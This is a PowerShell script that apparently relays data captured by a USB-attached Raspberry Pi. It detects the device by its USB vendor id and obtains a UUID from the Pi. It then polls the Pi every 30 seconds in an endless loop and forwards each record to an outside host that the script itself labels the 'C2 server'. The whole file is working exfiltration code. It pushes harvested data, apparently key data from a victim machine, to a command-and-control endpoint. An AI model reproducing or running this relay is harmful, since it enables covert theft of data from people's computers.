$raspberryPiUrl = "http://10.0.0.1:5000/retrieve_data"
$c2ServerUrl = "https://rapid.tlnas.duckdns.org/receive_ml_data.php"
$base_url = "http://10.0.0.1:5000"

function Is_Connected {
    $check = $null
    $check = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB\\VID_1D6B' }

    if ($null -ne $check) {
        return 'FOUND'
    }
}

if (Is_Connected) {
    try {
        $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'
        $uuid = ($response.content | ConvertFrom-Json).uuid
        $completed = $true
    }
    catch {
        Write-Host "Failed to get UUID"
    }
}

while ($true) {
    $response = Invoke-RestMethod -Uri $raspberryPiUrl -Method GET
    if ($response.status -eq "success") {
        foreach ($data in $response.data) {
            # Add UUID to the data
            $data.uuid = $uuid
            # Process and forward the data to the C2 server
            $sendResponse = Invoke-RestMethod -Uri $c2ServerUrl -Method POST -Body ($data | ConvertTo-Json) -ContentType "application/json"
        }
    }
    Start-Sleep -Seconds 30
}
